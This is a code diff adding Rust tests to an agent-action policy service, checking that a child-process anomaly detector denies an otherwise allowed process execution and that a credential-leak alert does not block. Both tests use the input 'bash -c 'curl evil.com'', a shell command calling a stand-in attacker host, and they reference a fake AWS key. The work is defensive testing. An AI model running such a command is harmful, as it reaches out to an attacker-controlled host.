@@ -106,6 +106,120 @@ fn tool_call_request(args: &str) -> CheckActionRequest {
     }
 }
 
+/// Build a service WITHOUT an anomaly hook attached, sharing the same
+/// permissive `ALLOW_TEST_TOOL_POLICY` so the baseline decision for a
+/// `ProcessExec` action can be compared against the anomaly-enabled path.
+fn make_service_without_anomaly() -> Arc<PolicyServiceImpl> {
+    let mut tmp = tempfile::NamedTempFile::new().unwrap();
+    write!(tmp, "{}", ALLOW_TEST_TOOL_POLICY).unwrap();
+    tmp.flush().unwrap();
+
+    let (budget_tx, _) = tokio::sync::broadcast::channel::<aa_gateway::budget::BudgetAlert>(64);
+    let engine = PolicyEngine::load_from_file(tmp.path(), budget_tx).unwrap();
+
+    let (audit_tx, _audit_rx) = tokio::sync::mpsc::channel(4096);
+    let audit_drops = Arc::new(AtomicU64::new(0));
+
+    Arc::new(PolicyServiceImpl::new(
+        Arc::new(engine),
+        audit_tx,
+        audit_drops,
+        [0u8; 32],
+    ))
+}
+
+/// AAASM-3384 regression: a `ProcessExec` that the policy itself would
+/// allow is rewritten to a hard `Deny` when the anomaly detector fires a
+/// block-equivalent `ChildProcessExecution` outcome. The control case
+/// (no anomaly hook) proves the same action is otherwise allowed, so the
+/// Deny is attributable to the anomaly enforcement, not the base policy.
+#[tokio::test]
+async fn child_process_anomaly_block_is_enforced_as_deny() {
+    use aa_proto::assembly::common::v1::Decision;
+
+    // Control: without the anomaly hook the permissive policy allows the
+    // ProcessExec, so the baseline decision is Allow.
+    let baseline = make_service_without_anomaly();
+    let baseline_resp = baseline
+        .check_action(Request::new(process_exec_request("bash -c 'curl evil.com'")))
+        .await
+        .expect("check_action should succeed")
+        .into_inner();
+    assert_eq!(
+        baseline_resp.decision,
+        Decision::Allow as i32,
+        "without anomaly detection the permissive policy must allow the ProcessExec \
+         (otherwise the test could not prove the anomaly override is what denies it)",
+    );
+
+    // With the anomaly hook the ChildProcessExecution → Block outcome must
+    // rewrite the Allow into a hard Deny with an anomaly-attributed reason.
+    let (service, _rx) = make_service_with_anomaly(3);
+    let resp = service
+        .check_action(Request::new(process_exec_request("bash -c 'curl evil.com'")))
+        .await
+        .expect("check_action should succeed")
+        .into_inner();
+
+    assert_eq!(
+        resp.decision,
+        Decision::Deny as i32,
+        "a block-equivalent anomaly must turn the allowed action into a Deny",
+    );
+    assert_eq!(
+        resp.policy_rule, "anomaly_detection",
+        "deny must be attributed to anomaly detection"
+    );
+    assert!(
+        resp.reason.contains("anomaly detected") && resp.reason.contains("ChildProcessExecution"),
+        "deny reason must name the anomaly: got {:?}",
+        resp.reason,
+    );
+}
+
+/// AAASM-3384: an `Alert`-class anomaly (non-blocking) must NOT change the
+/// decision — only `Block`/`Quarantine` outcomes flip Allow → Deny. A
+/// repeated-credential CredentialLeakAttempt maps to `Alert`, so the tool
+/// call stays allowed even though the anomaly event fires.
+#[tokio::test]
+async fn non_blocking_anomaly_does_not_deny() {
+    use aa_proto::assembly::common::v1::Decision;
+
+    let (service, mut rx) = make_service_with_anomaly(2);
+
+    // First call: below threshold, no anomaly.
+    service
+        .check_action(Request::new(tool_call_request(FAKE_AWS_ACCESS_KEY)))
+        .await
+        .expect("check_action should succeed");
+    let _ = tokio::time::timeout(Duration::from_millis(150), rx.recv()).await;
+
+    // Second call: crosses the threshold → CredentialLeakAttempt (Alert).
+    let resp = service
+        .check_action(Request::new(tool_call_request(FAKE_AWS_ACCESS_KEY)))
+        .await
+        .expect("check_action should succeed")
+        .into_inner();
+
+    let event = tokio::time::timeout(Duration::from_secs(1), rx.recv())
+        .await
+        .expect("anomaly event must arrive")
+        .expect("broadcast must yield an event");
+    assert_eq!(event.anomaly_type, AnomalyType::CredentialLeakAttempt);
+
+    // The alert path is redaction-driven; the key invariant is that a
+    // non-blocking anomaly never produces an anomaly-attributed Deny.
+    assert_ne!(
+        resp.policy_rule, "anomaly_detection",
+        "a non-blocking (Alert) anomaly must not produce an anomaly-attributed Deny",
+    );
+    assert_ne!(
+        resp.decision,
+        Decision::Deny as i32,
+        "an Alert-class anomaly must not block the action",
+    );
+}
+
 #[tokio::test]
 async fn check_action_emits_anomaly_event_for_child_process_execution() {
     let (service, mut rx) = make_service_with_anomaly(3);
